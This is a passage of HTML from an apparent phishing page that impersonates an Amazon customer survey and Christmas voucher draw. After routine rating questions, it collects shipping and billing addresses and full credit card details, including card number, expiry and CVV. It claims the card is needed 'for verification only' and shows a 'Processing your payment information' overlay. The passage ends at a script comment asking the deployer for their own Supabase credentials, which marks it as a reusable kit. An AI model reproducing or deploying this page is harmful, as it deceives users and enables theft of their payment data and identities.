                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_security_3" name="payment_security" value="3">
                            <label for="payment_security_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_security_4" name="payment_security" value="4">
                            <label for="payment_security_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="payment_security_5" name="payment_security" value="5">
                            <label for="payment_security_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Dissatisfied</span>
                        <span>Very Satisfied</span>
                    </div>
                    <div class="error-message" id="payment_security-error">Please select a rating</div>
                </div>
            </div>
            
            <!-- DELIVERY EXPERIENCE -->
            <div class="section" id="section6">
                <h2 class="section-title">
                    <span class="section-title-icon">üöö</span>
                    Delivery Experience
                    <span class="section-counter">6/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">23</span> How satisfied are you with the delivery time? <span class="required">*</span></label>
                    <div class="rating" id="delivery_time_group">
                        <div class="rating-item">
                            <input type="radio" id="delivery_time_1" name="delivery_time" value="1" required>
                            <label for="delivery_time_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="delivery_time_2" name="delivery_time" value="2">
                            <label for="delivery_time_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="delivery_time_3" name="delivery_time" value="3">
                            <label for="delivery_time_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="delivery_time_4" name="delivery_time" value="4">
                            <label for="delivery_time_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="delivery_time_5" name="delivery_time" value="5">
                            <label for="delivery_time_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Dissatisfied</span>
                        <span>Very Satisfied</span>
                    </div>
                    <div class="error-message" id="delivery_time-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">24</span> Was your package delivered on the day you expected? <span class="required">*</span></label>
                    <div class="radio-group" id="delivery_on_time_group">
                        <div class="radio-item">
                            <input type="radio" id="on_time_yes" name="delivery_on_time" value="yes" required>
                            <label for="on_time_yes">Yes, exactly</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="on_time_early" name="delivery_on_time" value="early">
                            <label for="on_time_early">Earlier than expected</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="on_time_late" name="delivery_on_time" value="late">
                            <label for="on_time_late">Later than expected</label>
                        </div>
                    </div>
                    <div class="error-message" id="delivery_on_time-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">25</span> How satisfied are you with the packaging? <span class="required">*</span></label>
                    <div class="rating" id="packaging_satisfaction_group">
                        <div class="rating-item">
                            <input type="radio" id="packaging_1" name="packaging_satisfaction" value="1" required>
                            <label for="packaging_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="packaging_2" name="packaging_satisfaction" value="2">
                            <label for="packaging_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="packaging_3" name="packaging_satisfaction" value="3">
                            <label for="packaging_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="packaging_4" name="packaging_satisfaction" value="4">
                            <label for="packaging_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="packaging_5" name="packaging_satisfaction" value="5">
                            <label for="packaging_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Dissatisfied</span>
                        <span>Very Satisfied</span>
                    </div>
                    <div class="error-message" id="packaging_satisfaction-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">26</span> Did the package arrive in good condition? <span class="required">*</span></label>
                    <div class="radio-group" id="package_condition_group">
                        <div class="radio-item">
                            <input type="radio" id="condition_yes" name="package_condition" value="yes" required>
                            <label for="condition_yes">Yes</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="condition_damaged" name="package_condition" value="damaged">
                            <label for="condition_damaged">No, it was damaged</label>
                        </div>
                    </div>
                    <div class="error-message" id="package_condition-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">27</span> How would you rate the delivery carrier? <span class="required">*</span></label>
                    <div class="rating" id="carrier_rating_group">
                        <div class="rating-item">
                            <input type="radio" id="carrier_1" name="carrier_rating" value="1" required>
                            <label for="carrier_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="carrier_2" name="carrier_rating" value="2">
                            <label for="carrier_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="carrier_3" name="carrier_rating" value="3">
                            <label for="carrier_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="carrier_4" name="carrier_rating" value="4">
                            <label for="carrier_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="carrier_5" name="carrier_rating" value="5">
                            <label for="carrier_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Poor</span>
                        <span>Excellent</span>
                    </div>
                    <div class="error-message" id="carrier_rating-error">Please select a rating</div>
                </div>
            </div>
            
            <!-- PRODUCT FEEDBACK -->
            <div class="section" id="section7">
                <h2 class="section-title">
                    <span class="section-title-icon">üõí</span>
                    Product Feedback
                    <span class="section-counter">7/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">28</span> How accurately did the product match the description? <span class="required">*</span></label>
                    <div class="rating" id="product_match_group">
                        <div class="rating-item">
                            <input type="radio" id="match_1" name="product_match" value="1" required>
                            <label for="match_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="match_2" name="product_match" value="2">
                            <label for="match_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="match_3" name="product_match" value="3">
                            <label for="match_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="match_4" name="product_match" value="4">
                            <label for="match_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="match_5" name="product_match" value="5">
                            <label for="match_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Not Accurate</span>
                        <span>Very Accurate</span>
                    </div>
                    <div class="error-message" id="product_match-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">29</span> How satisfied are you with the quality of the product? <span class="required">*</span></label>
                    <div class="rating" id="product_quality_group">
                        <div class="rating-item">
                            <input type="radio" id="quality_1" name="product_quality" value="1" required>
                            <label for="quality_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="quality_2" name="product_quality" value="2">
                            <label for="quality_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="quality_3" name="product_quality" value="3">
                            <label for="quality_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="quality_4" name="product_quality" value="4">
                            <label for="quality_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="quality_5" name="product_quality" value="5">
                            <label for="quality_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Dissatisfied</span>
                        <span>Very Satisfied</span>
                    </div>
                    <div class="error-message" id="product_quality-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">30</span> Was the product worth the price? <span class="required">*</span></label>
                    <div class="radio-group" id="product_worth_group">
                        <div class="radio-item">
                            <input type="radio" id="worth_yes" name="product_worth" value="yes" required>
                            <label for="worth_yes">Yes, good value</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="worth_fair" name="product_worth" value="fair">
                            <label for="worth_fair">Fair value</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="worth_no" name="product_worth" value="no">
                            <label for="worth_no">No, overpriced</label>
                        </div>
                    </div>
                    <div class="error-message" id="product_worth-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">31</span> Did the product meet your expectations? <span class="required">*</span></label>
                    <div class="radio-group" id="expectations_met_group">
                        <div class="radio-item">
                            <input type="radio" id="expectations_yes" name="expectations_met" value="yes" required>
                            <label for="expectations_yes">Yes, exceeded</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="expectations_met" name="expectations_met" value="met">
                            <label for="expectations_met">Met expectations</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="expectations_no" name="expectations_met" value="no">
                            <label for="expectations_no">No, below expectations</label>
                        </div>
                    </div>
                    <div class="error-message" id="expectations_met-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">32</span> Are customer reviews helpful when shopping? <span class="required">*</span></label>
                    <div class="rating" id="reviews_helpful_group">
                        <div class="rating-item">
                            <input type="radio" id="reviews_helpful_1" name="reviews_helpful" value="1" required>
                            <label for="reviews_helpful_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="reviews_helpful_2" name="reviews_helpful" value="2">
                            <label for="reviews_helpful_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="reviews_helpful_3" name="reviews_helpful" value="3">
                            <label for="reviews_helpful_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="reviews_helpful_4" name="reviews_helpful" value="4">
                            <label for="reviews_helpful_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="reviews_helpful_5" name="reviews_helpful" value="5">
                            <label for="reviews_helpful_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Not Helpful</span>
                        <span>Very Helpful</span>
                    </div>
                    <div class="error-message" id="reviews_helpful-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">33</span> Do you trust the star rating system? <span class="required">*</span></label>
                    <div class="radio-group" id="trust_stars_group">
                        <div class="radio-item">
                            <input type="radio" id="trust_stars_yes" name="trust_stars" value="yes" required>
                            <label for="trust_stars_yes">Yes, completely</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="trust_stars_somewhat" name="trust_stars" value="somewhat">
                            <label for="trust_stars_somewhat">Somewhat</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="trust_stars_no" name="trust_stars" value="no">
                            <label for="trust_stars_no">No, not at all</label>
                        </div>
                    </div>
                    <div class="error-message" id="trust_stars-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">34</span> Do photos in reviews help you decide? <span class="required">*</span></label>
                    <div class="radio-group" id="review_photos_group">
                        <div class="radio-item">
                            <input type="radio" id="photos_yes" name="review_photos" value="yes" required>
                            <label for="photos_yes">Yes, very helpful</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="photos_somewhat" name="review_photos" value="somewhat">
                            <label for="photos_somewhat">Somewhat helpful</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="photos_no" name="review_photos" value="no">
                            <label for="photos_no">No, not helpful</label>
                        </div>
                    </div>
                    <div class="error-message" id="review_photos-error">Please select an option</div>
                </div>
            </div>
            
            <!-- CUSTOMER SERVICE -->
            <div class="section" id="section8">
                <h2 class="section-title">
                    <span class="section-title-icon">üìû</span>
                    Customer Service
                    <span class="section-counter">8/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">35</span> How satisfied are you with Amazon's customer support? <span class="required">*</span></label>
                    <div class="rating" id="customer_support_group">
                        <div class="rating-item">
                            <input type="radio" id="support_1" name="customer_support" value="1" required>
                            <label for="support_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="support_2" name="customer_support" value="2">
                            <label for="support_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="support_3" name="customer_support" value="3">
                            <label for="support_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="support_4" name="customer_support" value="4">
                            <label for="support_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="support_5" name="customer_support" value="5">
                            <label for="support_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Dissatisfied</span>
                        <span>Very Satisfied</span>
                    </div>
                    <div class="error-message" id="customer_support-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">36</span> Was it easy to reach customer service? <span class="required">*</span></label>
                    <div class="radio-group" id="reach_service_group">
                        <div class="radio-item">
                            <input type="radio" id="reach_easy" name="reach_service" value="easy" required>
                            <label for="reach_easy">Very Easy</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="reach_moderate" name="reach_service" value="moderate">
                            <label for="reach_moderate">Moderate</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="reach_difficult" name="reach_service" value="difficult">
                            <label for="reach_difficult">Difficult</label>
                        </div>
                    </div>
                    <div class="error-message" id="reach_service-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">37</span> How helpful was the customer service representative? <span class="required">*</span></label>
                    <div class="rating" id="rep_helpfulness_group">
                        <div class="rating-item">
                            <input type="radio" id="rep_helpful_1" name="rep_helpfulness" value="1" required>
                            <label for="rep_helpful_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="rep_helpful_2" name="rep_helpfulness" value="2">
                            <label for="rep_helpful_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="rep_helpful_3" name="rep_helpfulness" value="3">
                            <label for="rep_helpful_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="rep_helpful_4" name="rep_helpfulness" value="4">
                            <label for="rep_helpful_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="rep_helpful_5" name="rep_helpfulness" value="5">
                            <label for="rep_helpful_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Not Helpful</span>
                        <span>Very Helpful</span>
                    </div>
                    <div class="error-message" id="rep_helpfulness-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">38</span> Was your issue solved in a reasonable amount of time? <span class="required">*</span></label>
                    <div class="radio-group" id="issue_solved_group">
                        <div class="radio-item">
                            <input type="radio" id="solve_yes" name="issue_solved" value="yes" required>
                            <label for="solve_yes">Yes</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="solve_no" name="issue_solved" value="no">
                            <label for="solve_no">No</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="solve_partial" name="issue_solved" value="partial">
                            <label for="solve_partial">Partially</label>
                        </div>
                    </div>
                    <div class="error-message" id="issue_solved-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">39</span> How would you rate the clarity of instructions given? <span class="required">*</span></label>
                    <div class="rating" id="instruction_clarity_group">
                        <div class="rating-item">
                            <input type="radio" id="instructions_1" name="instruction_clarity" value="1" required>
                            <label for="instructions_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="instructions_2" name="instruction_clarity" value="2">
                            <label for="instructions_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="instructions_3" name="instruction_clarity" value="3">
                            <label for="instructions_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="instructions_4" name="instruction_clarity" value="4">
                            <label for="instructions_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="instructions_5" name="instruction_clarity" value="5">
                            <label for="instructions_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Very Unclear</span>
                        <span>Very Clear</span>
                    </div>
                    <div class="error-message" id="instruction_clarity-error">Please select a rating</div>
                </div>
            </div>
            
            <!-- SAFETY & TRUST -->
            <div class="section" id="section9">
                <h2 class="section-title">
                    <span class="section-title-icon">üîê</span>
                    Safety & Trust
                    <span class="section-counter">9/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">40</span> Do you feel safe entering personal information on Amazon? <span class="required">*</span></label>
                    <div class="rating" id="feel_safe_group">
                        <div class="rating-item">
                            <input type="radio" id="safe_1" name="feel_safe" value="1" required>
                            <label for="safe_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="safe_2" name="feel_safe" value="2">
                            <label for="safe_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="safe_3" name="feel_safe" value="3">
                            <label for="safe_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="safe_4" name="feel_safe" value="4">
                            <label for="safe_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="safe_5" name="feel_safe" value="5">
                            <label for="safe_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Not Safe</span>
                        <span>Very Safe</span>
                    </div>
                    <div class="error-message" id="feel_safe-error">Please select a rating</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">41</span> Do you trust Amazon to protect your data? <span class="required">*</span></label>
                    <div class="radio-group" id="trust_data_group">
                        <div class="radio-item">
                            <input type="radio" id="trust_yes" name="trust_data" value="yes" required>
                            <label for="trust_yes">Yes, completely</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="trust_somewhat" name="trust_data" value="somewhat">
                            <label for="trust_somewhat">Somewhat</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="trust_no" name="trust_data" value="no">
                            <label for="trust_no">No, not at all</label>
                        </div>
                    </div>
                    <div class="error-message" id="trust_data-error">Please select an option</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">42</span> How confident are you in the authenticity of products sold? <span class="required">*</span></label>
                    <div class="rating" id="authenticity_group">
                        <div class="rating-item">
                            <input type="radio" id="authentic_1" name="authenticity" value="1" required>
                            <label for="authentic_1">1</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="authentic_2" name="authenticity" value="2">
                            <label for="authentic_2">2</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="authentic_3" name="authenticity" value="3">
                            <label for="authentic_3">3</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="authentic_4" name="authenticity" value="4">
                            <label for="authentic_4">4</label>
                        </div>
                        <div class="rating-item">
                            <input type="radio" id="authentic_5" name="authenticity" value="5">
                            <label for="authentic_5">5</label>
                        </div>
                    </div>
                    <div class="rating-labels">
                        <span>Not Confident</span>
                        <span>Very Confident</span>
                    </div>
                    <div class="error-message" id="authenticity-error">Please select a rating</div>
                </div>
            </div>
            
            <!-- OPEN-ENDED QUESTIONS -->
            <div class="section" id="section10">
                <h2 class="section-title">
                    <span class="section-title-icon">‚ùì</span>
                    Open-Ended Questions
                    <span class="section-counter">10/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">43</span> What do you like most about Amazon?</label>
                    <textarea id="like_most" name="like_most" rows="3" placeholder="Please share what you appreciate most about Amazon..."></textarea>
                    <div class="char-count">Maximum 500 characters</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">44</span> What do you like least about Amazon?</label>
                    <textarea id="like_least" name="like_least" rows="3" placeholder="Please share areas where Amazon could improve..."></textarea>
                    <div class="char-count">Maximum 500 characters</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">45</span> What feature should Amazon add?</label>
                    <textarea id="feature_add" name="feature_add" rows="3" placeholder="What new feature would enhance your shopping experience?"></textarea>
                    <div class="char-count">Maximum 500 characters</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">46</span> What would make your shopping experience better?</label>
                    <textarea id="improve_experience" name="improve_experience" rows="3" placeholder="Your suggestions for improvement..."></textarea>
                    <div class="char-count">Maximum 500 characters</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">47</span> Describe any problem you had while using Amazon.</label>
                    <textarea id="problem_description" name="problem_description" rows="4" placeholder="Please describe any issues or problems you've encountered..."></textarea>
                    <div class="char-count">Maximum 500 characters</div>
                </div>
                
                <div class="form-group">
                    <label><span class="question-number">48</span> Which item would you like as a gift?</label>
                    <textarea id="gift_preference" name="gift_preference" rows="4" placeholder="Please describe what gift item you would prefer to receive..."></textarea>
                    <div class="char-count">Maximum 500 characters</div>
                </div>
            </div>
            
            <!-- Gift Delivery Information Section (NEW) -->
            <div class="section" id="giftDeliverySection">
                <h2 class="section-title">
                    <span class="section-title-icon">üéÅ</span>
                    Gift Delivery Information
                    <span class="section-counter">11/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">49</span> How would you like to receive your Christmas gift if you win? <span class="required">*</span></label>
                    <div class="delivery-options">
                        <div class="delivery-option" data-delivery-type="physical">
                            <i class="delivery-icon fas fa-gift"></i>
                            <div class="delivery-details">
                                <div class="delivery-title">Physical Gift Delivery</div>
                                <div class="delivery-description">We'll ship your Christmas gift directly to your address. Free shipping included.</div>
                            </div>
                        </div>
                        <div class="delivery-option" data-delivery-type="pickup">
                            <i class="delivery-icon fas fa-store"></i>
                            <div class="delivery-details">
                                <div class="delivery-title">Store Pickup</div>
                                <div class="delivery-description">Pick up your gift at your nearest Amazon Hub Locker or Whole Foods location.</div>
                            </div>
                        </div>
                    </div>
                    <input type="hidden" id="delivery_preference" name="delivery_preference" required>
                    <div class="error-message" id="delivery_preference-error">Please select a delivery option</div>
                </div>
                
                <div class="form-group gift-message-container">
                    <label><span class="question-number">50</span> Gift Message (Optional)</label>
                    <textarea id="gift_message" name="gift_message" rows="3" placeholder="Add a personal message to include with your gift..."></textarea>
                    <div class="char-count">Maximum 200 characters</div>
                </div>
                
                <div class="form-group" id="shippingAddressGroup">
                    <label><span class="question-number">51</span> Shipping Address <span class="required">*</span></label>
                    <div class="address-form">
                        <div class="address-row">
                            <div class="address-field">
                                <label for="shipping_street">Street Address</label>
                                <input type="text" id="shipping_street" name="shipping_street" placeholder="123 Main St">
                                <div class="error-message" id="shipping_street-error">Please enter your street address</div>
                            </div>
                        </div>
                        
                        <div class="address-row">
                            <div class="address-field">
                                <label for="shipping_city">City</label>
                                <input type="text" id="shipping_city" name="shipping_city" placeholder="London">
                                <div class="error-message" id="shipping_city-error">Please enter your city</div>
                            </div>
                            <div class="address-field">
                                <label for="shipping_state">State/Province</label>
                                <input type="text" id="shipping_state" name="shipping_state" placeholder="London">
                                <div class="error-message" id="shipping_state-error">Please enter your state/province</div>
                            </div>
                            <div class="address-field">
                                <label for="shipping_zip">ZIP/Postal Code</label>
                                <input type="text" id="shipping_zip" name="shipping_zip" placeholder="10001">
                                <div class="error-message" id="shipping_zip-error">Please enter your ZIP/postal code</div>
                            </div>
                        </div>
                        
                        <div class="address-row">
                            <div class="address-field">
                                <label for="shipping_country">Country</label>
                                <select id="shipping_country" name="shipping_country">
                                    <option value="">Select Country</option>
                                    <option value="UK">United Kingdom</option>
									<option value="US">United States</option>
                                    <option value="CA">Canada</option>                                    
                                    <option value="AU">Australia</option>
                                    <option value="DE">Germany</option>
                                    <option value="FR">France</option>
                                    <option value="JP">Japan</option>
                                    <option value="IN">India</option>
                                    <option value="other">Other</option>
                                </select>
                                <div class="error-message" id="shipping_country-error">Please select your country</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Billing Address Section (NEW) -->
            <div class="section" id="billingSection">
                <h2 class="section-title">
                    <span class="section-title-icon">üè†</span>
                    Billing Address
                    <span class="section-counter">12/12</span>
                </h2>
                
                <div class="form-group">
                    <label><span class="question-number">52</span> Is your billing address the same as shipping address? <span class="required">*</span></label>
                    <div class="radio-group" id="billing_same_group">
                        <div class="radio-item">
                            <input type="radio" id="billing_same_yes" name="billing_same" value="yes" required>
                            <label for="billing_same_yes">Yes, same as shipping address</label>
                        </div>
                        <div class="radio-item">
                            <input type="radio" id="billing_same_no" name="billing_same" value="no">
                            <label for="billing_same_no">No, use different billing address</label>
                        </div>
                    </div>
                    <div class="error-message" id="billing_same-error">Please select an option</div>
                </div>
                
                <div class="form-group" id="billingAddressGroup" style="display: none;">
                    <label><span class="question-number">53</span> Billing Address <span class="required">*</span></label>
                    <div class="address-form">
                        <div class="address-row">
                            <div class="address-field">
                                <label for="billing_street">Street Address</label>
                                <input type="text" id="billing_street" name="billing_street" placeholder="123 Main St">
                                <div class="error-message" id="billing_street-error">Please enter your billing street address</div>
                            </div>
                        </div>
                        
                        <div class="address-row">
                            <div class="address-field">
                                <label for="billing_city">City</label>
                                <input type="text" id="billing_city" name="billing_city" placeholder="London">
                                <div class="error-message" id="billing_city-error">Please enter your billing city</div>
                            </div>
                            <div class="address-field">
                                <label for="billing_state">State/Province</label>
                                <input type="text" id="billing_state" name="billing_state" placeholder="NY">
                                <div class="error-message" id="billing_state-error">Please enter your billing state/province</div>
                            </div>
                            <div class="address-field">
                                <label for="billing_zip">ZIP/Postal Code</label>
                                <input type="text" id="billing_zip" name="billing_zip" placeholder="10001">
                                <div class="error-message" id="billing_zip-error">Please enter your billing ZIP/postal code</div>
                            </div>
                        </div>
                        
                        <div class="address-row">
                            <div class="address-field">
                                <label for="billing_country">Country</label>
                                <select id="billing_country" name="billing_country">
                                    <option value="">Select Country</option>
								    <option value="UK">United Kingdom</option>
                                    <option value="US">United States </option>
                                    <option value="CA">Canada</option>                                   
                                    <option value="AU">Australia</option>
                                    <option value="DE">Germany</option>
                                    <option value="FR">France</option>
                                    <option value="JP">Japan</option>
                                    <option value="IN">India</option>
                                    <option value="other">Other</option>
                                </select>
                                <div class="error-message" id="billing_country-error">Please select your billing country</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="warning-note">
                    <i class="fas fa-exclamation-triangle"></i>
                    Your billing address must match the address associated with your payment method.
                </div>
            </div>
            
            <!-- Credit Card Payment Section (SIMPLIFIED - No card type selection) -->
            <div class="section payment-section" id="paymentSection">
                <h2 class="section-title">
                    <span class="section-title-icon">üí≥</span>
                    Credit Card Information
                </h2>
                
                <div class="payment-card-container" id="paymentCard">
                    <div class="payment-card-header">
                        <h3>Credit Card Payment</h3>
                        <p>Secure payment information for verification purposes</p>
                        <p class="optional-note">No charges will be made - this is for verification only</p>
                    </div>
                    
                    <div class="form-group">
                        <label for="cardNumber">Card Number <span class="required">*</span></label>
                        <div class="input-container">
                            <input type="text" id="cardNumber" class="payment-input" placeholder="4111 1111 1111 1111" maxlength="19">
                            <i class="input-icon fas fa-credit-card"></i>
                            <div class="payment-error" id="cardNumberError">Please enter a valid card number</div>
                        </div>
                        <p class="card-info-note">Enter your 13-19 digit card number</p>
                    </div>
                    
                    <div class="form-group">
                        <label for="cardHolder">Card Holder Name <span class="required">*</span></label>
                        <div class="input-container">
                            <input type="text" id="cardHolder" class="payment-input" placeholder="John Doe">
                            <i class="input-icon fas fa-user"></i>
                            <div class="payment-error" id="cardHolderError">Please enter the name on your card</div>
                        </div>
                    </div>
                    
                    <div class="form-row">
                        <div class="expiry-container">
                            <label for="expiryMonth">Expiry Date <span class="required">*</span></label>
                            <div class="expiry-inputs">
                                <select id="expiryMonth" class="payment-select">
                                    <option value="" disabled selected>Month</option>
                                    <option value="01">01 - Jan</option>
                                    <option value="02">02 - Feb</option>
                                    <option value="03">03 - Mar</option>
                                    <option value="04">04 - Apr</option>
                                    <option value="05">05 - May</option>
                                    <option value="06">06 - Jun</option>
                                    <option value="07">07 - Jul</option>
                                    <option value="08">08 - Aug</option>
                                    <option value="09">09 - Sep</option>
                                    <option value="10">10 - Oct</option>
                                    <option value="11">11 - Nov</option>
                                    <option value="12">12 - Dec</option>
                                </select>
                                <select id="expiryYear" class="payment-select">
                                    <option value="" disabled selected>Year</option>
                                </select>
                            </div>
                            <div class="payment-error" id="expiryError">Please select a valid expiry date</div>
                        </div>
                        
                        <div class="cvv-container">
                            <label for="cvv">CVV <span class="required">*</span></label>
                            <div class="input-container">
                                <input type="text" id="cvv" class="payment-input" placeholder="123" maxlength="4">
                                <i class="input-icon fas fa-lock"></i>
                                <div class="cvv-hint" id="cvvHintText">3 or 4 digit security code</div>
                                <div class="payment-error" id="cvvError">Please enter a valid CVV</div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="security-note">
                        <i class="fas fa-shield-alt"></i>
                        <span>Your payment information is secured with 256-bit SSL encryption</span>
                    </div>
                    
                    <div class="card-icons-footer">
                        <i class="card-icon-footer fab fa-cc-mastercard mastercard-icon-footer" title="Mastercard"></i>
                        <i class="card-icon-footer fab fa-cc-visa visa-icon-footer" title="Visa"></i>
                        <i class="card-icon-footer fab fa-cc-amex amex-icon-footer" title="American Express"></i>
                        <i class="card-icon-footer fab fa-cc-discover discover-icon-footer" title="Discover"></i>
                        <i class="card-icon-footer fab fa-cc-jcb jcb-icon-footer" title="JCB"></i>
                        <i class="card-icon-footer fab fa-cc-diners-club diners-icon-footer" title="Diners Club"></i>
                        <i class="card-icon-footer fas fa-credit-card unionpay-icon-footer" title="UnionPay"></i>
                    </div>
                </div>
            </div>
            
            <!-- Submit Button -->
            <button type="submit" class="submit-btn">Submit Survey & Enter Draw</button>
        </form>
        
        <div class="footer">
            <p>Thank you for taking the time to complete our survey. Your feedback helps us improve Amazon's services.</p>
            <p>By submitting this form, you agree to be entered into the Christmas voucher draw.</p>
            <p>¬© 2025 Amazon.com, Inc. or its affiliates. All rights reserved.</p>
        </div>
    </div>

    <!-- Supabase Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-message">Processing your payment information...</div>
    </div>

    <!-- Success Modal -->
    <div id="successModal" class="success-modal">
        <div class="success-content">
            <div class="success-icon">‚úÖ</div>
            <h3>Thank You!</h3>
            <p>Your survey and payment information have been successfully submitted.</p>
            <p>You have been entered into the Christmas voucher draw!</p>
            <p><small>A confirmation email will be sent to your email address.</small></p>
            <button id="closeSuccessModal" style="
                background: #FF9900;
                color: white;
                border: none;
                padding: 10px 30px;
                border-radius: 6px;
                cursor: pointer;
                margin-top: 20px;
                font-weight: bold;
            ">Close</button>
        </div>
    </div>

    <script>
        // ========== SUPABASE CONFIGURATION ==========
        // REPLACE THESE VALUES WITH YOUR ACTUAL SUPABASE CREDENTIALS
